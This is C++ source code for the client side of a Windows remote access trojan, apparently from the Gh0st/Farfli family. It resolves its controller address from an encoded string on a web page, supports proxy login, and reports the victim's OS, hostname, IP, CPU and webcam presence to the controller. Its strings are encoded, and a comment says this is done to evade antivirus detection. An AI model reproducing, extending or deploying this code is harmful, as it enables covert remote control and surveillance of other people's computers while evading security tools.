
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
#include "decode.h"
#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;


void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
					char **lppszProxyUser, char **lppszProxyPass)
{
	*lppszHost = NULL;
	*lppPort = 0;
	*lppszProxyHost = NULL;
	*lppProxyPort = 0;
	*lppszProxyUser = NULL;
	*lppszProxyPass = NULL;

	bool	bIsProxyUsed = false;
	bool	bIsAuth = false;
	UINT	nSize = lstrlen(lpDecodeString) + 1;
	char	*lpString = new char[nSize];
	memcpy(lpString, lpDecodeString, nSize);
	
	char	*pStart, *pNext, *pEnd;
	*lppszHost = lpString;

	if ((pStart = strchr(lpString, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsProxyUsed = true;
		*pNext = '\0';
	}
	*lppPort = atoi(pStart + 1);
	
	if (!bIsProxyUsed)
		return;

	pNext++;
	*lppszProxyHost = pNext;

	if ((pStart = strchr(pNext, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsAuth = true;
		*pNext = '\0';
	}
	*lppProxyPort = atoi(pStart + 1);
	
	if (!bIsAuth)
		return;
	
	pNext++;
	*lppszProxyUser = pNext;
	if ((pStart = strchr(pNext, ':')) == NULL)
		return;
	*pStart = '\0';
	*lppszProxyPass = pStart + 1;
}

bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
				  char **lppszProxyUser, char **lppszProxyPass)
{
	if (lpURL == NULL)
		return false;
	char	*pStart, *pEnd;
	char	buffer[2048];
	char	strEncode[1024];

	DWORD	dwBytesRead = 0;
	bool	bRet = false;

	// 没有找到网址，用域名上线
	if (strstr(lpURL, "http://") == NULL && strstr(lpURL, "https://") == NULL)
	{
		SplitLoginInfo(lpURL, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		return true;
	}

	HINTERNET	hNet;
	HINTERNET	hFile;

	//strcry----------------------------------------------------
	//char Mozilla[] = { 0x18,0x86,0xa5,0xb3,0xa1,0xab,0xaa,0xa4,0xeb,0xf7,0xec,0xf1,0xe0,0x97,0xdd,0xd2,0xd1,0xcb,0xdb,0xcd,0xd1,0xd5,0xda,0xd0,0x9d };	//Mozilla/4.0 (compatible)
	//char* pMozilla = decodeStr(Mozilla);					//解密函数
	//
	//hNet = InternetOpen(pMozilla, INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	//
	//memset(pMozilla, 0, pMozilla[STR_CRY_LENGTH]);					//填充0
	//delete pMozilla;
	hNet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	//----------------------------------------------------------


	if (hNet == NULL)
		return bRet;
	hFile = InternetOpenUrl(hNet, lpURL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL)
		return bRet;
	
	do
	{
		memset(buffer, 0, sizeof(buffer));
		InternetReadFile(hFile, buffer, sizeof(buffer), &dwBytesRead);
		
		if ((pStart = strstr(buffer, "AAAA")) == NULL) 
			continue;
		pStart += 4;
		if ((pEnd = strstr(pStart, "AAAA")) == NULL)
			continue;

		memset(strEncode, 0, sizeof(strEncode));
		memcpy(strEncode, pStart, pEnd - pStart);

		char *lpDecodeString = MyDecode(strEncode);

		SplitLoginInfo(lpDecodeString, lppszHost, lppPort, lppszProxyHost, lppProxyPort, lppszProxyUser, lppszProxyPass);
		bRet = true;
	} while (dwBytesRead > 0);
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hNet);
	
	return bRet;
}


// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;

	//HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0
	//Anti Anti- Virus eset : a variant of Win32/Farfli.ADV trojan 
	char HARDWARE[] = { 0x2e,0x83,0x8b,0x9b,0x8c,0x90,0x87,
		0x97,0x81,0x9f,0x86,0x84,0x93,0xfc,0xec,0xf4,0xec,
		0xef,0xf3,0xf6,0xf6,0xeb,0xe5,0xcc,0xc7,0xc7,0xd7,
		0xdc,0xec,0xec,0xcb,0xc3,0xd8,0xd9,0xcb,0xc5,0xf8,
		0xd5,0xc9,0xc6,0xc1,0xd0,0xd1,0xce,0xd2,0xc3,0xae
	};	//WinSta0\Default
	char* pHARDWARE = decodeStr(HARDWARE);  //解密函数


	//RegOpenKey(HKEY_LOCAL_MACHINE, pHARDWARE, &hKey);
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	//------------------------------------------------------------------------------------------------

	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);

	RegCloseKey(hKey);

	memset(pHARDWARE, 0, HARDWARE[STR_CRY_LENGTH]);					//填充0
	delete pHARDWARE;


	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

	//strcry SYSTEM\CurrentControlSet\Services\%s
	char Services[] = { 0x24,0x98,0x93,0x9a,0x9c,0x82,0x8b,
		0x99,0x87,0xb6,0xb0,0xb3,0xa5,0xd1,0xca,0xfe,0xd3,
		0xd5,0xce,0xcb,0xd7,0xdb,0xe5,0xd0,0xc0,0xef,0xe1,
		0xd4,0xc2,0xd9,0xc7,0xce,0xc9,0xd8,0xf6,0x8c,0xdb };	//WinSta0\Default
	char* pServices = decodeStr(Services);							//解密函数

	//wsprintf(strSubKey, "SYSTEM\CurrentControlSet\Services\%s", lpServiceName);
	
	wsprintf(strSubKey, pServices, lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	memset(strSubKey, 0, sizeof(strSubKey));
	memset(pServices, 0, Services[STR_CRY_LENGTH]);					//填充0
	delete pServices;

	return lstrlen(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
